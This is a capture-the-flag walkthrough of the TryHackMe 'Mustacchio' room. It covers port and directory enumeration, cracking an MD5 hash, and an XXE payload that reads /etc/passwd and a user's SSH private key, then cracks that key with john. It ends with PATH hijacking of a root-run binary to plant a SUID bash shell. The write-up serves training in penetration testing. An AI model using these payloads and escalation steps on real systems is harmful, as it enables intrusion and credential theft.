# Mustacchio

![image](https://user-images.githubusercontent.com/5285547/121743836-e0ac7c80-caf9-11eb-8112-a3e7e5a189bc.png)

[Room Link](https://tryhackme.com/room/mustacchio)

## Enumeration

### Nmap
```bash
nmap -p- -v 10.10.68.59
```

```bash
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8765/tcp open  ultraseek-http

```

### Gobuster 

```bash
gobuster dir -u http://10.10.68.59  -w  /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x txt,html,gz,php,js,zip,img,bak -t 45
```
http://10.10.68.59/
```bash
/gallery.html         (Status: 200) [Size: 1950]
/index.html           (Status: 200) [Size: 1752]
/images               (Status: 301) [Size: 311] [--> http://10.10.68.59/images/]
/contact.html         (Status: 200) [Size: 1450]                                
/blog.html            (Status: 200) [Size: 3172]                                
/about.html           (Status: 200) [Size: 3152]                                
/custom               (Status: 301) [Size: 311] [--> http://10.10.68.59/custom/]
/robots.txt           (Status: 200) [Size: 28]                                  
/fonts                (Status: 301) [Size: 310] [--> http://10.10.68.59/fonts/] 
```
http://10.10.68.59/custom/
```bash
/css                  (Status: 301) [Size: 315] [--> http://10.10.68.59/custom/css/]
/js                   (Status: 301) [Size: 314] [--> http://10.10.68.59/custom/js/]
```
http://10.10.68.59/custom/js/
```bash
/users.bak            (Status: 200) [Size: 8192]
/mobile.js            (Status: 200) [Size: 1470]
```

Here I found a users.bak file.  
I downloaded it to check the contents.  
It looked to be a mysql or database command for creating a new user

![image](https://user-images.githubusercontent.com/5285547/121745773-be682e00-cafc-11eb-951c-aff68f56f379.png)

We have a username: Admin 

http://10.10.68.59:8765/
```bash
/home.php             (Status: 302) [Size: 1993] [--> ../index.php]
/index.php            (Status: 200) [Size: 1363]                   
/assets               (Status: 301) [Size: 194] [--> http://10.10.68.59:8765/assets/]
/auth                 (Status: 301) [Size: 194] [--> http://10.10.68.59:8765/auth/] 
```

## Website's (port 80, 8765)

### Port 80

![image](https://user-images.githubusercontent.com/5285547/121744541-f9696200-cafa-11eb-9b2f-eeb05996505d.png)

This portal contains a blog for "mustacchio" brand for all mankind!  
Checking the webpages source code revealed nothing, but i noted a mobile.js script file included.  
Pressing F12 and using the developer console. I looked at the source code for the mobile.js file. 

![image](https://user-images.githubusercontent.com/5285547/121744888-7b598b00-cafb-11eb-8b8d-6741f1d9b90b.png)

I see some md5 at the bottom of the source code so try it on https://crackstation.net/  

![image](https://user-images.githubusercontent.com/5285547/121745099-d55a5080-cafb-11eb-852e-bb56347012c3.png)

Now we have a username and password but nowhere to use them!?

### Port 8765

http://10.10.68.59:8765/

This page presents us with what we need for our credentials, a login page. 

![image](https://user-images.githubusercontent.com/5285547/121746171-5d8d2580-cafd-11eb-9c70-328eff1493a4.png)

## XML

After loggin in we get presented with this page

![image](https://user-images.githubusercontent.com/5285547/121746302-94633b80-cafd-11eb-8967-24ee1bc995f4.png)

Pressing the submit button causes a pop up box to appear

![image](https://user-images.githubusercontent.com/5285547/121746351-ad6bec80-cafd-11eb-9b68-e51cd7b0a08b.png)

Like it said to, inject some xml!
I got a payload from the internet here: https://github.com/payloadbox/xxe-injection-payload-list
After injection, some text appereard at the bottom of the page, indicating some structure needed for the xml.

![image](https://user-images.githubusercontent.com/5285547/121746652-1d7a7280-cafe-11eb-88c7-e39980cafe3f.png)

Checking our payload sent.

```xml
<!--?xml version="1.0" ?-->
<userInfo>
 <firstName>John</firstName>
 <lastName>Doe</lastName>
</userInfo>
```

Then noting the response we got, which was "Comment Preview,Name, Author, Comment". I built a simuilar xml element with a root tag.

```xml
<!--?xml version="1.0" ?-->
<root>
 <commentPreview>John</commentPreview>
 <name>Doe</name>
 <author>Doe</author>
 <comment>John</comment>
</root>
```

Injecting this into the page left me with better results. 

![image](https://user-images.githubusercontent.com/5285547/121747164-dd67bf80-cafe-11eb-937a-bb120221768d.png)

Lets try to get a file next /etc/passwd as the usual test

```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd"> ]>
<root>
 <commentPreview>John</commentPreview>
 <name>&ent;</name>
 <author>Doe</author>
 <comment>John</comment>
</root>
```
![image](https://user-images.githubusercontent.com/5285547/121747279-13a53f00-caff-11eb-95b2-48b44ee149e2.png)

While I was in the source code I see a comment and some code above to give a few more hints about what to do next. 

![image](https://user-images.githubusercontent.com/5285547/121747510-6e3e9b00-caff-11eb-90a9-27f73d59beeb.png)

We can ssh as Barry but we need his id_rsa key. Using the file inclusion method above, I was able to get his id_rsa.
But, it was locked with a password..

![image](https://user-images.githubusercontent.com/5285547/121747692-b5c52700-caff-11eb-9a2a-fadcbfe6a5c3.png)

Time to get john out for a cracking good time! 

```bash
find / -name ssh2john* 2>/dev/null
python ssh2john id_rsa > hash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

![image](https://user-images.githubusercontent.com/5285547/121747920-03da2a80-cb00-11eb-9a14-3d7389bcb601.png)

## User

Now we can login as Barry with his password and get our first flag!

```bash
ssh barry@10.10.68.59 -i id_rsa
```

![image](https://user-images.githubusercontent.com/5285547/121748244-8bc03480-cb00-11eb-8825-a385e9074344.png)

![image](https://user-images.githubusercontent.com/5285547/121748305-a2ff2200-cb00-11eb-93b9-6c121b69bcc1.png)

## Root

Looking arond the system I found a strange file in Joe's home file (ELF) called "live_log", 
I check it with strings to see what it maybe doing.
We can see the tail binary being called but its path is not absolute! Runnig the file

![image](https://user-images.githubusercontent.com/5285547/121748473-f1acbc00-cb00-11eb-89a4-f9b57c88396c.png)

```
./live_log
```
I checked the system process's. The file was being ran as root.

Knowing a file can be abused using path manipulation, I set about making a file that would be ran when the "live_log" was run. 

```bash
cd /tmp
```
```bash
nano tail
#/!bin/bash
cp /bin/bash /tmp/b
chmod u+s /tmp/b
```

Save the file and then enter the next comamnds so we can run the executable. Then set the path to /tmp first to call our file before the real tail file. 
```bash
chmod +x tail
export PATH=/tmp:$PATH
```

Now we can run and get our last flag.
```bash
/tmp/b -p
```

![image](https://user-images.githubusercontent.com/5285547/121749233-3ab14000-cb02-11eb-9d97-5d8f5f3d6688.png)


Thanks and happy hacking! :)




